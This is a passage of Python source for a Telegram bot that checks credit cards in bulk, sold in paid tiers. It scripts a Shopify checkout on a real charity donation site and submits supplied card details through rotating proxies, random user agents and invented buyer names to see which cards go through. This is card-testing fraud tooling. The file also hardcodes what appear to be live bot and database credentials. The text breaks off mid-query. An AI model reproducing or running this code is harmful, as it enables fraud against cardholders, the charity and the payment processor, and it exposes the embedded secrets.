import aiohttp
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import re
import json
import time
import asyncio
import random
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from pymongo import MongoClient
from datetime import datetime, timedelta
import logging
from typing import Optional, List, Dict, Tuple

# Configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

TOKEN = "8181079198:AAFIE0MVuCPWaC0w1HbBsHlCLJKKGpbDneM"  # Replace with your bot token
MONGO_URI = "mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"  # Replace with your MongoDB URI
OWNER_ID = 7593550190  # Replace with your Telegram user ID
USE_PROXIES = True  # Set to False to disable proxies
CONCURRENT_LIMIT = 3  # Max cards to check concurrently per user
TIMEOUT_SECONDS = 70  # Timeout between batches

# MongoDB Setup
try:
    mongo_client = MongoClient(MONGO_URI)
    db = mongo_client['fn_cc_checker']
    users_collection = db['users']
    keys_collection = db['keys']
    mongo_client.admin.command('ping')  # Test connection
    logger.info("MongoDB connection established")
except Exception as e:
    logger.error(f"Failed to connect to MongoDB: {str(e)}")
    raise

# Tier Limits
TIER_LIMITS = {
    'Gold': 500,
    'Platinum': 1000,
    'Co-Owner': 1500
}

# Proxy Management
def load_proxies() -> List[str]:
    if not USE_PROXIES:
        return []
    try:
        with open('proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(proxies)} proxies from proxies.txt")
        return proxies
    except FileNotFoundError:
        logger.error("proxies.txt not found")
        return []
    except Exception as e:
        logger.error(f"Error loading proxies: {str(e)}")
        return []

proxies = load_proxies()

async def get_proxy() -> Optional[dict]:
    if not proxies or not USE_PROXIES:
        return None
    proxy = random.choice(proxies)
    try:
        return {'http': proxy, 'https': proxy}
    except Exception as e:
        logger.warning(f"Invalid proxy format: {proxy}. Error: {str(e)}")
        return None

# Utility Functions
def find_between(s: str, first: str, last: str) -> str:
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        logger.error(f"Failed to find substring between '{first}' and '{last}'")
        return ""

def parse_card(card_input: str) -> tuple[Optional[str], Optional[str], Optional[str], Optional[str]]:
    try:
        cc_raw, mm, yy, cvc = card_input.strip().split("|")
        cc = " ".join(cc_raw[i:i+4] for i in range(0, len(cc_raw), 4))
        mm = str(int(mm))
        yy = "20" + yy if len(yy) == 2 else yy
        return cc, mm, yy, cvc
    except Exception as e:
        logger.error(f"Card parsing failed: {str(e)}")
        return None, None, None, None

emails = ["nicochan275@gmail.com"]
first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]

# Core Card Checking Logic
async def sh(message: str, proxy_used: bool = False) -> Tuple[str, bool]:
    start_time = time.time()
    text = message.strip()
    pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(pattern, text)

    if not match:
        logger.error("Invalid card format detected")
        return "Invalid card format. Please provide a valid card number, month, year, and cvv.", proxy_used

    n = match.group(1)
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm = match.group(2)
    mm = str(int(mm))
    yy = match.group(3)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    elif len(yy) == 2:
        yy = yy
    else:
        logger.error("Invalid year format in card details")
        return "Invalid year format.", proxy_used
    cvc = match.group(4)

    full_card = f"{n}|{mm}|{yy}|{cvc}"

    ua = UserAgent()
    user_agent = ua.random
    remail = random.choice(emails)
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)

    async with aiohttp.ClientSession() as r:
        proxy = await get_proxy()
        proxy_used = proxy is not None
        try:
            async with r.get(f'https://bins.antipublic.cc/bins/{n[:6]}', proxy=proxy) as res:
                if res.status == 200:
                    logger.info(f"BIN lookup successful for card {n[:6]}: Status 200 OK")
                    z = await res.json()
                    bin = z['bin']
                    bank = z['bank']
                    brand = z['brand']
                    type = z['type']
                    level = z['level']
                    country = z['country_name']
                    flag = z['country_flag']
                    currency = z['country_currencies'][0]
                else:
                    logger.error(f"BIN lookup failed for card {n[:6]}: Status {res.status}")
                    return f"BIN Lookup failed: Status {res.status}", proxy_used
        except Exception as e:
            logger.error(f"BIN lookup exception: {str(e)}. Proxy: {proxy}")
            proxy_used = False
            return f"BIN Lookup failed: {str(e)}", proxy_used

        url = "https://www.buildingnewfoundations.com/cart/add.js"
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }
        data = {
            'form_type': 'product',
            'utf8': '✓',
            'id': '39555780771934',
            'quantity': '1',
            'product-id': '6630341279838',
            'section-id': 'product-template',
        }
        try:
            async with r.post(url, headers=headers, data=data, proxy=proxy) as response:
                if response.status == 200:
                    logger.info("Cart add successful: Status 200 OK")
                else:
                    logger.error(f"Cart add failed: Status {response.status}")
                    return f"Cart add failed: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Cart add exception: {str(e)}. Proxy: {proxy}")
            proxy_used = False
            return f"Cart add failed: {str(e)}", proxy_used

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }

        try:
            async with r.get('https://www.buildingnewfoundations.com/cart.js', headers=headers, proxy=proxy) as response:
                raw = await response.text()
                if response.status == 200:
                    logger.info("Cart retrieval successful: Status 200 OK")
                    try:
                        res_json = json.loads(raw)
                        tok = res_json['token']
                    except json.JSONDecodeError as e:
                        logger.error(f"JSON decode error in cart retrieval: {str(e)}")
                        return f"Cart retrieval failed: Invalid JSON response", proxy_used
                else:
                    logger.error(f"Cart retrieval failed: Status {response.status}")
                    return f"Cart retrieval failed: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Cart retrieval exception: {str(e)}. Proxy: {proxy}")
            proxy_used = False
            return f"Cart retrieval failed: {str(e)}", proxy_used

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/cart',
            'user-agent': user_agent,
        }
        data = {
            'updates[]': '1',
            'checkout': 'Check out',
        }
        try:
            async with r.post(
                'https://www.buildingnewfoundations.com/cart',
                headers=headers,
                data=data,
                allow_redirects=True,
                proxy=proxy
            ) as response:
                text = await response.text()
                if response.status == 200:
                    logger.info("Cart checkout initiation successful: Status 200 OK")
                    x = find_between(text, 'serialized-session-token" content=""', '""')
                    queue_token = find_between(text, '"queueToken":"', '"')
                    stableid = find_between(text, 'stableId":"', '"')
                    paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier":"', '"')
                else:
                    logger.error(f"Cart checkout initiation failed: Status {response.status}")
                    return f"Cart checkout initiation failed: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Cart checkout initiation exception: {str(e)}. Proxy: {proxy}")
            proxy_used = False
            return f"Cart checkout initiation failed: {str(e)}", proxy_used

        headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'user-agent': user_agent,
        }
        json_data = {
            'credit_card': {
                'number': cc,
                'month': mm,
                'year': yy,
                'verification_value': cvc,
                'name': f'{rfirst} {rlast}',
            },
            'payment_session_scope': 'buildingnewfoundations.com',
        }
        try:
            async with r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, proxy=proxy) as response:
                if response.status == 200:
                    logger.info("Payment session creation successful: Status 200 OK")
                    try:
                        sid = (await response.json())['id']
                    except Exception as e:
                        logger.error(f"Payment session JSON parse error: {str(e)}")
                        return f"No token: {str(e)}", proxy_used
                else:
                    logger.error(f"Payment session creation failed: Status {response.status}")
                    return f"No token: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Payment session creation exception: {str(e)}. Proxy: {proxy}")
            proxy_used = False
            return f"No token: {str(e)}", proxy_used

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'user-agent': user_agent,
            'x-checkout-one-session-token': x,
        }
        params = {
            'operationName': 'SubmitForCompletion',
        }
        json_data = {
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount 